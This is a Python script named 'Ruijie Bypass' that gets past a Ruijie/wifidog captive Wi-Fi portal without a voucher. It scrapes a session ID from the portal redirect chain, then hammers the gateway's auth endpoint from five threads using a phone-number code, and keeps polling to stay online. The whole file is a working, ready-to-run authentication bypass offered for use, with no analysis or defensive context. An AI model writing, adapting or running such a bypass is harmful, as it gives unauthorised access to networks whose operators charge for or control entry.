#!/usr/bin/env python3
"""
Ruijie Bypass - Pure ping method (no voucher API needed)
"""
import sys, threading, time, urllib.parse
import requests, urllib3
urllib3.disable_warnings()

def main():
    code = "102762"
    if len(sys.argv) > 1:
        code = sys.argv[1]

    print(f"[Ruijie] Code: {code}")
    while True:
        try:
            # Step 1: Detect portal - GET any site and follow redirects
            sess = requests.Session()
            sess.verify = False

            r = sess.get("http://connectivitycheck.gstatic.com/generate_204",
                         timeout=10, allow_redirects=True)

            # Already online?
            if r.status_code == 204:
                try:
                    r2 = requests.get("http://www.google.com", timeout=3)
                    if r2.status_code == 200:
                        sess.close(); time.sleep(5); continue
                except: pass

            # Parse portal URL
            portal_url = r.url
            parsed = urllib.parse.urlparse(portal_url)
            params = urllib.parse.parse_qs(parsed.query)
            host = f"{parsed.scheme}://{parsed.netloc}"
            gw_addr = params.get("gw_address", ["192.168.10.1"])[0]
            gw_port = params.get("gw_port", ["2060"])[0]

            # Step 2: Get sessionId from portal chain
            r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
            sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]

            if not sid:
                print("[!] No SID"); sess.close(); time.sleep(3); continue

            print(f"[SID] {sid[:16]}...  [GW] {gw_addr}:{gw_port}  [Phone] {code}")

            # Step 3: High-speed ping with phonenumber (5 threads, 10/sec each)
            ping_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber={code}"
            stop = False

            def pinger():
                while not stop:
                    try: sess.get(ping_url, timeout=3)
                    except: break

            for _ in range(5):
                threading.Thread(target=pinger, daemon=True).start()

            # Step 4: Check internet every 2 seconds
            for i in range(30):
                time.sleep(2)
                try:
                    r = requests.get("http://www.google.com", timeout=3)
                    if r.status_code == 200:
                        print("*** ONLINE ***")
                        stop = True
                        # Stay online
                        while True:
                            time.sleep(5)
                            try:
                                r = sess.get(ping_url, timeout=3)
                                if requests.get("http://www.google.com", timeout=3).status_code != 200:
                                    break
                            except: break
                        print("[Disconnected]")
                        break
                except: pass
            else:
                print("[Failed]")

            stop = True
            sess.close()
            time.sleep(3)

        except KeyboardInterrupt:
            print("\nStopped"); sys.exit(0)
        except Exception as e:
            print(f"[!] {e}")
            time.sleep(3)

if __name__ == "__main__":
    main()
